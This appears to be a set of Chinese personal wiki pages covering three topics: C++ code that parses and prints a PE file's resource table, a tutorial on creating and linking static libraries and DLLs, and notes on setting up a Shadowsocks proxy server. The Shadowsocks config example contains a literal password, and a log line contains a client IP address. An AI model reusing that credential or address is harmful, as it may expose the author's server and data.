位图（Bitmap） RT_ICON 3 图标（Icon） RT_MENU 4 菜单（Menu） RT_DIALOG 5 对话框（Dialog） RT_STRING 6 字符串（String） RT_FONTDIR 7 字体目录（Font Directory） RT_FONT 8 字体（Font） RT_ACCELERATOR 9 加速键（Accelerators） RT_RCDATA 10 未格式化资源（Unformatted） RT_MESSAGETABLE 11 消息表（MessageTable） RT_GROUP_CURSOR 12 光标组（Group Cursor） RT_GROUP_ICON 14 图标组（Group Icon） RT_VERSION 16 版本信息（Version Information） 加速键（Accelerators）指的是快捷键 图标组是对图标信息的描述 只在程序中加了一个图标，但用ResHacker看会有好几个图标。这是编译器为了适应不同分辨率情况，加的图标 在第二层中，资源目录块表示资源的ID。在第二层时，资源目录项中的Name字段表示这是标准命名还是非标准命名。 在第三层中，资源目录块表示资源的代码页。在第三层时，资源目录项中的Name字段表示这是一个标准还是非标准的语言。 详细细节具体看《WindowsPE权威指南》P207-208 IMAGE_RESOURCE_DATA_ENTRY中第二个Union字段 理论上来说资源结构可以是n层，但一般是三层结构。第一第二层这个值最高位为1，用OffsetToDirectory字段，指向下一层资源目录块。在第三层时，用OffsetToData字段，指向真实的资源数据块。 打印资源表 资源这种结构设计，理论上支持n级。但一般是三层，也就是说层数是知道的，所以可以写个循环来打印。但为了以后代码的更新维护，这里用递归的方式实现资源表打印。 对于每一个节点： 打印它的资源目录头部分 打印它的资源目录项部分 在不同层级，目录项里字段代表的含义不同。在递归函数用一个参数表示层级 对于第一个Union联合结构 在第一层，表示这个资源是标准还是非标准类型 在第二层，表示这个资源是标准命名还是非标准命名 在第三层，表示这个资源是标准语言代码还是非标准语言代码 对于第二个Union联合结构 在第一层，指向下一级资源目录块 在第二层，指向下一级资源目录块 在第三层，指向下一级资源数据项 函数大致框架123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//pResourceDirectory：指向资源目录块/节点//level：层级VOID PrintResourceDirectory(PIMAGE_RESOURCE_DIRECTORY pResourceDirectory, int level)&#123; //1、打印资源目录头 //...... //2、打印资源目录项 auto pResourceDirectoryEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((DWORD)pResourceDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY)); for (int i = 0; i &lt; pResourceDirectory-&gt;NumberOfNamedEntries + pResourceDirectory-&gt;NumberOfIdEntries; ++i) &#123; // 处理第一个Union结构 if (level == 1) // 第一层，表示资源的类型 &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // 最高位为1，指向Unicode字符串结构。非标准类型资源 &#123; //... &#125; else // 最高位为0，Id字段。标准资源类型 &#123; //... &#125; &#125; else if (level == 2) // 第二层，表示资源的ID &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // 最高位为1，指向Unicode字符串结构。非标准ID &#123; //... &#125; else // 最高位为0，Id字段。标准资源ID &#123; //... &#125; &#125; else if (level == 3) // 第三层，表示资源的代码页 &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // 最高位为1，指向Unicode字符串结构。非标准语言 &#123; //... &#125; else // 最高位为0，Id字段。标准语言 &#123; //... &#125; &#125; // 处理第二个Union结构 if (pResourceDirectoryEntry-&gt;DataIsDirectory) // 最高位为1，指向下一级目录 &#123; //... //递归调用 &#125; else // 最高位为0，指向数据 &#123; //... &#125; pResourceDirectoryEntry++; &#125;&#125; 打印资源表递归函数记录标准资源类型数值和文字的映射123456789VOID PEManipulator::PrintResourceTable()&#123; auto pResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_RESOURCE); if (!pResourceDirectory) &#123; return; &#125; PrintResourceDirectory(pResourceDirectory, 1); // 开始打印一级资源目录&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111VOID PEManipulator::PrintResourceDirectory(PIMAGE_RESOURCE_DIRECTORY pResourceDirectory, int level)&#123; if (!pResourceDirectory) //参数检查 &#123; return; &#125; // 资源表起始位置，已转为FOA auto pBaseResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_RESOURCE); if (!pBaseResourceDirectory) &#123; return; &#125; // 根据层级生成缩进字符串，每层缩进25个空格 char Indent[70] = &#123; 0 &#125;; for (int i = 0; i &lt; (level - 1) * 25 &amp;&amp; i &lt; sizeof(Indent) - 1; ++i) &#123; Indent[i] = &#x27; &#x27;; &#125; //1、打印资源目录头 printf(&quot;%s[%d级资源目录头] &quot;, Indent, level); printf(&quot;%sCharacteristics: 0x%08X &quot;, Indent, pResourceDirectory-&gt;Characteristics); printf(&quot;%sTimeDateStamp: 0x%08X &quot;, Indent, pResourceDirectory-&gt;TimeDateStamp); printf(&quot;%sMajorVersion: 0x%04X &quot;, Indent, pResourceDirectory-&gt;MajorVersion); printf(&quot;%sMinorVersion: 0x%04X &quot;, Indent, pResourceDirectory-&gt;MinorVersion); printf(&quot;%sNumberOfNamedEntries: 0x%04X &quot;, Indent, pResourceDirectory-&gt;NumberOfNamedEntries); printf(&quot;%sNumberOfIdEntries: 0x%04X &quot;, Indent, pResourceDirectory-&gt;NumberOfIdEntries); //2、打印资源目录项 auto pResourceDirectoryEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((DWORD)pResourceDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY)); for (int i = 0; i &lt; pResourceDirectory-&gt;NumberOfNamedEntries + pResourceDirectory-&gt;NumberOfIdEntries; ++i) &#123; printf(&quot;%s[%d级资源目录项] &quot;, Indent, level); // 处理第一个Union结构 if (level == 1) // 第一层，表示资源的类型 &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // 最高位为1，指向Unicode字符串结构。非标准类型资源 &#123; auto pResourceString = (PIMAGE_RESOURCE_DIR_STRING_U)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;NameOffset); printf(&quot;%sName: &quot;, Indent); for (int j = 0; j &lt; pResourceString-&gt;Length; ++j) &#123; printf(&quot;%c&quot;, pResourceString-&gt;NameString[j]); &#125; printf(&quot; &quot;); &#125; else // 最高位为0，Id字段。标准资源类型 &#123; WORD ResourceId = pResourceDirectoryEntry-&gt;Id; const char* ResourceType = GetResourceTypeString(ResourceId); printf(&quot;%sId: 0x%04X (%s) &quot;, Indent, ResourceId, ResourceType); &#125; &#125; else if (level == 2) // 第二层，表示资源的ID &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // 最高位为1，指向Unicode字符串结构。非标准ID &#123; auto pResourceString = (PIMAGE_RESOURCE_DIR_STRING_U)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;NameOffset); printf(&quot;%sName: &quot;, Indent); for (int j = 0; j &lt; pResourceString-&gt;Length; ++j) &#123; printf(&quot;%c&quot;, pResourceString-&gt;NameString[j]); &#125; printf(&quot; &quot;); &#125; else // 最高位为0，Id字段。标准资源ID &#123; WORD ResourceId = pResourceDirectoryEntry-&gt;Id; printf(&quot;%sId: 0x%04X &quot;, Indent, ResourceId); &#125; &#125; else if (level == 3) // 第三层，表示资源的代码页 &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // 最高位为1，指向Unicode字符串结构。非标准语言 &#123; auto pResourceString = (PIMAGE_RESOURCE_DIR_STRING_U)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;NameOffset); printf(&quot;%sLanguage: &quot;, Indent); for (int j = 0; j &lt; pResourceString-&gt;Length; ++j) &#123; printf(&quot;%c&quot;, pResourceString-&gt;NameString[j]); &#125; printf(&quot; &quot;); &#125; else // 最高位为0，Id字段。标准语言 &#123; WORD ResourceId = pResourceDirectoryEntry-&gt;Id; printf(&quot;%sLanguageId: 0x%04X &quot;, Indent, ResourceId); &#125; &#125; // 处理第二个Union结构 if (pResourceDirectoryEntry-&gt;DataIsDirectory) // 最高位为1，指向下一级目录 &#123; printf(&quot;%sOffsetToDirectory: 0x%08X （指向下一级目录） &quot;, Indent, pResourceDirectoryEntry-&gt;OffsetToData); //按OffsetToData打，把最高位也打印了 auto pSubResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;OffsetToDirectory); PrintResourceDirectory(pSubResourceDirectory, level + 1); // 递归调用 &#125; else // 最高位为0，指向数据 &#123; printf(&quot;%sOffsetToData: 0x%08X （指向数据） &quot;, Indent, pResourceDirectoryEntry-&gt;OffsetToData); auto pResourceDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;OffsetToData); printf(&quot; %s[资源表的数据信息] &quot;, Indent); printf(&quot; %sOffsetToData: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;OffsetToData); printf(&quot; %sSize: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;Size); printf(&quot; %sCodePage: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;CodePage); printf(&quot; %sReserved: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;Reserved); &#125; pResourceDirectoryEntry++; &#125;&#125;123456789101112131415161718192021222324252627const char* PEManipulator::GetResourceTypeString(WORD resourceId)&#123; static const std::unordered_map&lt;WORD, std::string&gt; resourceTypeMap = &#123; &#123;1, &quot;Cursor 光标&quot;&#125;, &#123;2, &quot;Bitmap 位图&quot;&#125;, &#123;3, &quot;Icon 图标&quot;&#125;, &#123;4, &quot;Menu 菜单&quot;&#125;, &#123;5, &quot;Dialog 对话框&quot;&#125;, &#123;6, &quot;String 字符串&quot;&#125;, &#123;7, &quot;Font Directory 字体目录&quot;&#125;, &#123;8, &quot;Font 字体 &quot;&#125;, &#123;9, &quot;Accelerators 加速键&quot;&#125;, &#123;10, &quot;Unformatted 未格式化资源 &quot;&#125;, &#123;11, &quot;MessageTable 消息表&quot;&#125;, &#123;12, &quot;Group Cursor 光标组&quot;&#125;, &#123;14, &quot;Group Icon 图标组&quot;&#125;, &#123;16, &quot;Version Information 版本信息&quot;&#125; &#125;; auto it = resourceTypeMap.find(resourceId); // 在map中查找指定的键 if (it != resourceTypeMap.end()) // 如果找到 &#123; return it-&gt;second.c_str(); // 返回对应的字符串 &#125; return &quot;Unknown（未知）&quot;; // 如果没找到，返回&quot;Unknown（未知）&quot;&#125; 上面的代码有几处细节提一下： 为了更清晰地表示层级关系，会根据level层级控制打印时前面的缩进 Indent全为0，将前面i个字符设置为“ ”空字符，打印时打印Indent（即输出空字符），到0结束打印 123456// 根据层级生成缩进字符串，每层缩进32个空格char Indent[70] = &#123; 0 &#125;;for (int i = 0; i &lt; (level - 1) * 25 &amp;&amp; i &lt; sizeof(Indent) - 1; ++i)&#123; Indent[i] = &#x27; &#x27;;&#125; 资源目录项中两个Union结构的偏移都是相对于资源表的起始位置，即数据目录表中描述资源表的VirtualSize字段。因为笔者是在FileBuffer（未拉伸状态）上解析打印资源表，所以相关字段的定位=(DWORD)FileBuffer+资源表FOA+偏移。每个递归函数中可能要用到资源表起始位置，于是在函数前边用变量记录了资源表的起始位置 123456// 资源表起始位置，已转为FOAauto pBaseResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_RESOURCE);if (!pBaseResourceDirectory) &#123; return;&#125; 打印Unicode字符串 指向字符串后，挨个打印每个字符。Unicode占2字节，遇到&quot;00&quot;就相当于没打印东西 1234567auto pResourceString = (PIMAGE_RESOURCE_DIR_STRING_U)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;NameOffset);printf(&quot;%sName: &quot;, Indent);for (int j = 0; j &lt; pResourceString-&gt;Length; ++j)&#123; printf(&quot;%c&quot;, pResourceString-&gt;NameString[j]);&#125;printf(&quot; &quot;); 第一层时Id字段表示预定义的资源类型，用一个map存数值与资源类型文字的映射。GetResourceTypeString接收一个id，返回出相应字符串 123456789101112131415161718192021222324252627const char* PEManipulator::GetResourceTypeString(WORD resourceId)&#123; static const std::unordered_map&lt;WORD, std::string&gt; resourceTypeMap = &#123; &#123;1, &quot;Cursor 光标&quot;&#125;, &#123;2, &quot;Bitmap 位图&quot;&#125;, &#123;3, &quot;Icon 图标&quot;&#125;, &#123;4, &quot;Menu 菜单&quot;&#125;, &#123;5, &quot;Dialog 对话框&quot;&#125;, &#123;6, &quot;String 字符串&quot;&#125;, &#123;7, &quot;Font Directory 字体目录&quot;&#125;, &#123;8, &quot;Font 字体 &quot;&#125;, &#123;9, &quot;Accelerators 加速键&quot;&#125;, &#123;10, &quot;Unformatted 未格式化资源 &quot;&#125;, &#123;11, &quot;MessageTable 消息表&quot;&#125;, &#123;12, &quot;Group Cursor 光标组&quot;&#125;, &#123;14, &quot;Group Icon 图标组&quot;&#125;, &#123;16, &quot;Version Information 版本信息&quot;&#125; &#125;; auto it = resourceTypeMap.find(resourceId); // 在map中查找指定的键 if (it != resourceTypeMap.end()) // 如果找到 &#123; return it-&gt;second.c_str(); // 返回对应的字符串 &#125; return &quot;Unknown（未知）&quot;; // 如果没找到，返回&quot;Unknown（未知）&quot;&#125; 处理第二个Union结构时，如果指向下一级目录，指向下一级资源目录后，调用PrintResourceDirectory（递归）打印该节点 123456789101112// 处理第二个Union结构if (pResourceDirectoryEntry-&gt;DataIsDirectory) // 最高位为1，指向下一级目录&#123; printf(&quot;%sOffsetToDirectory: 0x%08X （指向下一级目录） &quot;, Indent, pResourceDirectoryEntry-&gt;OffsetToData); //按OffsetToData打，把最高位也打印了 auto pSubResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;OffsetToDirectory); PrintResourceDirectory(pSubResourceDirectory, level + 1); // 递归调用&#125;else // 最高位为0，指向数据&#123; //...&#125; 如果指向的是资源数据，指过去后，直接打印资源表的数据信息 123456789101112131415161718// 处理第二个Union结构if (pResourceDirectoryEntry-&gt;DataIsDirectory) // 最高位为1，指向下一级目录&#123; //... //递归调用&#125;else // 最高位为0，指向数据&#123; //... auto pResourceDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;OffsetToData); printf(&quot; %s[资源表的数据信息] &quot;, Indent); printf(&quot; %sOffsetToData: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;OffsetToData); printf(&quot; %sSize: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;Size); printf(&quot; %sCodePage: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;CodePage); printf(&quot; %sReserved: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;Reserved);&#125; 测试函数12345678910111213int TestPrintResourceTable()&#123; //PEManipulator PEFile(&quot;E:\\\\temp\\\\ResourceTable\\\\fg.exe&quot;); //文件对齐=内存对齐，资源较多 PEManipulator PEFile(&quot;E:\\\\temp\\\\ResourceTable\\\\MyFirstDialog.exe&quot;); //资源较少 if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintResourceTable(); return 0;&#125; 运行结果 程序打印结果和用Lord PE工具打印的进行比对，各字段一致算程序正常 未来可完善的工作 编写程序，提供程序图标资源 编写程序，修改对话框标题"},{"title":"静态链接库和动态链接库","path":"/wiki/PE/静态链接库和动态链接库.html","content":"静态链接库 编写静态链接库并使用 1. 创建静态链接库项目 VSVC6方式一方式二创建空项目，按平时多文件编程那样写.h和.cpp文件。 修改项目属性：属性-&gt;配置属性-&gt;常规-&gt;配置类型，应用程序（.exe）修改为静态库（.lib）。这样之后点击生成，生成的就是.lib文件 这种方式VS会生成预编译头pch.h。按多文件编程那样创建.h和.cpp文件，每个.cpp文件中需要包含这个预编译头#include &quot;pch.h&quot;，否则编译不过去。 2. 编写代码并编译生成lib文件 ArithmeticOperations.h123456#pragma onceint Plus(int x, int y);int Sub(int x, int y);int Mul(int x, int y);int Div(int x, int y); ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int Plus(int x, int y)&#123;\treturn x + y;&#125;int Sub(int x, int y)&#123;\treturn x - y;&#125;int Mul(int x, int y)&#123;\treturn x * y;&#125;int Div(int x, int y)&#123;\treturn x / y;&#125; 点生成，编译生成lib文件 3. 使用静态链接库 将.h和.lib文件复制到要使用的项目中 在需要使用的文件中包含头文件#include &quot;xxx.h&quot; 1#include &quot;xxx.h&quot; //头文件，告诉编译器函数声明 链接lib库文件 链接方式一链接方式二123#pragma comment(lib, &quot;xxx.lib&quot;)\t//函数的实现在lib中 //这行告诉link链接时需要link的lib库文件 //如果代码中用到了Plus函数，不加这行，link时找不到函数的实现，就会报错项目，link设置加上这个lib库的文件名 从VS原本link的lib就可以看出，我们之前是使用过静态链接库的。比如我们之前包含了头文件windows.h，stdio.h然后就直接调用函数。因为头文件只有函数的声明，没有实现，实现都在lib文件中，IDE项目配置的link填的这些，就是帮我们编译时link这些lib VC6下Link设置的地方： 链接方式一的例子链接方式二的例子在需要使用lib库的源码文件中加上如下两行 例 main.cpp123456789#include &quot;ArithmeticOperations.h&quot;#pragma comment(lib,&quot;MyTestLib.lib&quot;)int main()&#123;\tint x = Plus(1, 2);\treturn 0;&#125; 编译，通过例：main.cpp1234567#include &quot;ArithmeticOperations.h&quot;int main()&#123;\tint x = Plus(1, 2);\treturn 0;&#125; 项目，link设置加上了这个lib库的文件名 编译，通过 静态链接库的特点 link时将静态链接库里的所有内容都编译到可执行文件exe里去了，会导致exe文件体积变大 从反汇编角度上看，是看不出是自己实现的还是用的lib中的 证明方法：VS中步进lib中的函数的函数地址，和正常写的函数的函数地址上看不出区别 如果lib库的函数实现需要更新，重新编译lib后，还需要重新编译exe；而dll改完，不用动exe 动态链接库 编写动态链接库并使用 1. 创建动态链接库项目 VSVC6方式一方式二创建空项目，按平时多文件编程那样写.h和.cpp文件。 修改项目属性：属性-&gt;配置属性-&gt;常规-&gt;配置类型，应用程序（.exe）修改为动态库（.dll）。这样之后点击生成，生成的就是.dll文件 这种方式VS会生成预编译头pch.h。按多文件编程那样创建.h和.cpp文件，每个.cpp文件中需要包含这个预编译头#include &quot;pch.h&quot;，否则编译不过去。 还会生成dllmain.cpp文件，这个dllmain函数是可选，不是必须的。 2. 编写代码并编译生成dll文件 ArithmeticOperations.h12345#pragma onceextern &quot;C&quot; _declspec(dllexport) int __stdcall Plus(int x, int y);extern &quot;C&quot; _declspec(dllexport) int __stdcall Sub(int x, int y);extern &quot;C&quot; _declspec(dllexport) int __stdcall Mul(int x, int y);extern &quot;C&quot; _declspec(dllexport) int __stdcall Div(int x, int y); ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int __stdcall Plus(int x, int y)&#123;\treturn x + y;&#125;int __stdcall Sub(int x, int y)&#123;\treturn x - y;&#125;int __stdcall Mul(int x, int y)&#123;\treturn x * y;&#125;int __stdcall Div(int x, int y)&#123;\treturn x / y;&#125; extern “C” 在C++中有函数重载（方便了程序员不用起名字，可以有多个名字相同，但参数类型，返回类型不同的函数），这时，一个函数的链接名（Linkage Name）是由函数的名称、参数类型和返回值类型等信息组成的，链接名的作用是在编译和链接时唯一标识该函数 参考： 作者: 编程指北 链接: https://csguide.cn/cpp/basics/extern_c.html#函数的命名规则 来源: https://csguide.cn extern &quot;C&quot;表示这个函数按照C语言的方式进行编译、链接 __declspec(dllexport)告诉编译器此函数为导出函数 不写这个前缀，就是普通的函数，这个函数不准备导出给别人用 为了清晰直观，通常会看到搭配宏的写法123456789101112131415161718192021222324#pragma once#ifdef DemoDll#define DemoDll_API __declspec(dllexport) // 导出#else#define DemoDll_API __declspec(dllimport) // 导入#endif // DemoDll/*\\ brief__cplusplus c++宏*/#ifdef __cplusplusextern &quot;C&quot;&#123;#endif // __cplusplus\t/* \\ brief 在这里编写 函数模块\t*/\tint DemoDll_API add(int a, int b);#ifdef __cplusplus&#125;#endif // __cplusplus 编译后看到生成如下文件： 用Dependencies查看这个dll看到上面四个函数被导出，说明生成成功 3. 使用动态链接库 使用方式一：隐式链接使用方式二：显示链接将 *.dll *.lib 放到工程目录下面 在上面lib的编写和使用中，lib放函数的实现，.h是函数的声明。而在这里，.dll里放函数的实 现代码，.lib里是说明这个函数的代码在哪里 动态库的 lib文件 与静态库的 lib文件 是不同的： 动态库的 lib文件 只是dll文件里导出函数的声明和定位信息。没有函数的实现。 而静态库的 lib文件 包含了函数的实现。 因此静态库的 lib文件 只是作用在编译阶段，不需要对外发布。 VS2019-静态库&amp;动态库-多项目操作 对于.lib文件（有两种添加方法） 属性页-&gt;链接器-&gt;常规-&gt;附加库目录（ 添加.lib文件路径）； 属性页-&gt;链接器-&gt;输入-&gt;附加依赖项 （添加.lib文件名） 直接用#pragma comment(lib,&quot;MyDll.lib) （需要将该lib文件放到与exe同目录下） 调用dll的例子main.cpp123456789101112#pragma comment(lib,&quot;MyTestDll.lib&quot;)extern &quot;C&quot; _declspec(dllimport) int __stdcall Plus(int x, int y);extern &quot;C&quot; _declspec(dllimport) int __stdcall Sub(int x, int y);extern &quot;C&quot; _declspec(dllimport) int __stdcall Mul(int x, int y);extern &quot;C&quot; _declspec(dllimport) int __stdcall Div(int x, int y);int main()&#123;\tint x = Plus(1, 2);\treturn 0;&#125; __declspec(dllimport)告诉编译器此函数为导入函数 隐式链接是让编译器去找这个dll，所以叫隐式。 显示链接是自己写代码自己去链接，用LoadLibrary将dll加载到自己的进程空间中 显式链接只需要一个文件：.dll文件。 所谓显式链接，就是直接调用WIN32 API函数LoadLibrary、GetProcAddress和FreeLibrary显式地装载、卸载dll。 步骤： 定义函数指针变量，用于接收dll中函数地址 使用LoadLibrary来讲dll加载到自己的进程空间中，获取该DLL的模块句柄 使用GetProcAddress获取dll中函数的地址 使用函数 使用FreeLibrary减少dll引用计数 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123;\t//1、动态加载dll到内存中 HMODULE hModule = LoadLibrary(TEXT(&quot;MyTestDll.dll&quot;));\tif (hModule == NULL)\t&#123; printf(&quot;[!] Failed to load MyTestDll.dll &quot;); return 0;\t&#125;\t//2、定义函数指针\tusing fpPlus = int(__stdcall*)(int, int);\tusing fpSub = int(__stdcall*)(int, int);\tusing fpMul = int(__stdcall*)(int, int);\tusing fpDiv = int(__stdcall*)(int, int);\t//3、声明函数指针变量，接收获取的函数地址 fpPlus myPlus = (fpPlus)GetProcAddress(hModule, &quot;_Plus@8&quot;);\tif (myPlus == NULL)\t&#123; printf(&quot;[!] Failed to get the address of _Plus@8 &quot;); FreeLibrary(hModule); return 0;\t&#125;\tfpSub mySub = (fpSub)GetProcAddress(hModule, &quot;_Sub@8&quot;); //检查mySub的值的代码略\tfpMul myMul = (fpMul)GetProcAddress(hModule, &quot;_Mul@8&quot;); //检查myMul的值的代码略\tfpDiv myDiv = (fpDiv)GetProcAddress(hModule, &quot;_Div@8&quot;); //检查myDiv的值的代码略\t//4、调用函数 int a = myPlus(10, 2);\tint b = mySub(10, 2);\tint c = myMul(10, 2);\tint d = myDiv(10, 2);\tprintf(&quot;%d %d %d %d &quot;, a, b, c, d);\t//5、减少dll引用计数\tFreeLibrary(hModule);\treturn 0;&#125; 动态链接库的特点 dll中的代码不会编译到可执行文件exe里，使用OD打开exe，在Module里能看到该exe要用到的dll 从反汇编角度上看，能看出是自己实现的还是用的dll中的函数 证明方法：VS中步进dll中的函数的函数地址，和正常写的函数的函数地址上有差别 如果dll中的函数实现需要更新，重新编译dll后，exe无需重新编译。从这个角度来讲，使用dll的方式实现了“模块化”（哪块有问题改哪块，其他的不受影响）。 使用.def方式导出函数 还有一种使用.def的方式对函数导出，可以在.def中指定函数的导出序号，函数名是否匿名导出。因为函数名这个信息很关键，去掉函数名后，逆向分析人员就没法通过函数名来猜测这个函数实现的功能。 导出函数，函数名和序号至少要有一个，要不别人没法引用这个函数。 使用.def文件导出函数 新建.def文件 添加后VS会自动添加该.def文件为链接器输入： 编写.def文件 ArithmeticOperations.h123456#pragma onceint __stdcall Plus(int x, int y);int __stdcall Sub(int x, int y);int __stdcall Mul(int x, int y);int __stdcall Div(int x, int y);Source.def1234567LIBRARYEXPORTS Plus @12\tSub @15 NONAME\tMul @13\tDiv @16 ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int __stdcall Plus(int x, int y)&#123;\treturn x + y;&#125;int __stdcall Sub(int x, int y)&#123;\treturn x - y;&#125;int __stdcall Mul(int x, int y)&#123;\treturn x * y;&#125;int __stdcall Div(int x, int y)&#123;\treturn x / y;&#125; 第一句必须是LIBRARY，后面跟的是DLL文件名。如果不填，默认使用DLL的文件名。 EXPORTS语句后： 列出要导出的函数名 @数字指定导出序号（虽然MSDN上说是1~N，N是导出的个数。但实际操作下来可以随意指定序号，不重复即可） 加上NONAME，导出时就没函数名，只有序号 .def文件格式参考：Exporting from a DLL Using DEF Files Exporting Functions from a DLL by Ordinal Rather Than by Name 用Dependencies查看用.def导出的dll 可以看到导出的函数。由于在.def文件中Sub函数那行加了NONAME，所以Sub函数的Function那一列就没有名字导出，只有序号导出 其实def文件的功能相当于extern “C” __declspec(dllexport)，无论函数的调用约定是啥，在.def写上函数名。生成的dll中导出函数名字一样的 使用只有序号导出的导出函数 用导出序号获取函数地址 12345678910111213141516171819202122232425262728293031323334#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123;\t//1、动态加载dll到内存中 HMODULE hModule = LoadLibrary(TEXT(&quot;MyTestDll.dll&quot;));\tif (hModule == NULL)\t&#123; printf(&quot;[!] Failed to load MyTestDll.dll &quot;); return 0;\t&#125;\t//2、定义函数指针\tusing fpSub = int(__stdcall*)(int, int);\t//3、声明函数指针变量，接收获取的函数地址 fpSub mySub = (fpSub)GetProcAddress(hModule, (LPCSTR)15);\tif (mySub == NULL)\t&#123; printf(&quot;[!] Failed to get the address of Sub &quot;); FreeLibrary(hModule); return 0;\t&#125;\t//4、调用函数 int b = mySub(10, 2);\tprintf(&quot;%d &quot;, b);\t//5、减少dll引用计数\tFreeLibrary(hModule);\treturn 0;&#125; 参考：C/C++ 导出 DLL 函数的一般方法 参考链接🔗 参考链接🔗 备注 且看一文梳理VS2019中dll的创建使用 总结得挺好的 extern “C” __declspec(dllexport) __declspec(dllimport) 和 def 导出声明搭配宏的写法不同调用约定函数导出后名字的变化 dll导出函数的两种方式的比较 扩展阅读不同的函数调用约定导出后函数的名字的变化（有截图）未来可能会用到 用关键词导出还是用.def导出： Determine Which Exporting Method to Use c++创建dll导出函数名称 未来可能用到的，导出C++重载函数怎么弄： C++ DLL def文件中的重载函数"},{"title":"shadowsocks原理与节点搭建","path":"/wiki/Proxy_Protocols/shadowsocks原理与节点搭建.html","content":"Shadowsocks 使用ss代理下的浏览器请求过程 使用shdowsocks代理协议节点进行科学上网，浏览器的请求过程是这样的： 浏览器生成请求，这个请求首先在应用层（例如HTTP请求）被创建。 然后，这个请求按照协议栈向下，通过传输层（通常是TCP），网络层（IP层），数据链路层，最后是物理层，这样数据包就准备好在本地网络上发送了。 由于网络配置中设置了代理，这个数据包不会直接发送到互联网上，而是发送到本地的监听端口1080，这是ss-local监听的端口。 ss-local接收到这个数据包后，在应用层对其内容进行加密，封装成Shadowsocks协议格式的数据包。 加密后的数据包再次通过协议栈：从应用层到传输层（通常是TCP），网络层（IP层），数据链路层，物理层，然后发送到互联网上，到达ss-server服务器。 ss-server服务器解密数据包，恢复成原始的HTTP或HTTPS请求，并将该请求发送到目标网站。 服务器收到来自google.com的响应后，ss-server将响应数据加密并发送回ss-local。 ss-local再次解密这些数据，并将原始的响应数据发送回浏览器，完成整个请求和响应的过程。 在浏览器请求发送的过程中，ss-local作为代理客户端在应用层进行加密处理；在浏览器响应数据发回的过程中，ss-local作为代理客户端在应用层进行解密处理。 简单来说，浏览器的请求在本地计算机上经过完整的协议栈封装后，被发送到本地的ss-local代理。ss-local在应用层处理这个请求，加密后再次通过协议栈发送到互联网上。 搭建ss节点相关命令 apt源方式安装源码编译方式安装安装shadowsocks 1apt install shadowsocks-libevUbuntu 20.04 安装 shadowsocks-libev 服务端 shadowsocks-libev_github_Debian &amp; Ubuntu 查看shadowsocks运行状态 1systemctl status shadowsocks-libev.service 编辑ss配置文件 1vim /etc/shadowsocks-libev/config.json json格式如下： 123456789&#123; &quot;server&quot; : &quot;0.0.0.0”, &quot;mode&quot; : &quot;tcp_and_udp&quot;, &quot;server_port&quot; :8388, &quot;local port&quot; : 1080, &quot;password&quot; : &quot;FMjzLMo700D&quot;, &quot;timeout&quot; : 86400, &quot;method&quot; : &quot;chacha20-ietf-poly1305&quot;&#125; （带gcm和poly1305后缀就是开启了AEAD） 重启shadowsocks 1systemctl restart shadowsocks-libev.service 查看shadowsocks运行日志 1journalctl -u shadowsocks-libev.service -f 防火墙相关配置： 123456789101112# 查看状态ufw status# 开放端口ufw allow 8388# 拒绝端口ufw deny 8388# 删除规则ufw delete allow 8388# 关闭防火墙ufw disable# 启动防火墙ufw enable 查看vps是否支持硬解aes（cpu带了aes的指令集，就可以加速aes）： 1lscpu | grep aes 裸奔的ss节点存在被探测的可能性 在vps上改好json配置文件，防火墙端口放行后。 在用户电脑上，用代理客户端软件，如用v2rayN添加ss节点的服务器，填上ip、端口，password，加密方式。 在vps上查看shadowsocks运行日志，在v2rayN测试真连接（用vps往谷歌发送一条请求）。通过日志是否有输出，有输出的话看输出，来判断是哪个环节出了问题。 在日志输出可能看到握手失败，鉴权失败的报错 1ERROR: failed to handshake with 124.117.196.42: authentication error 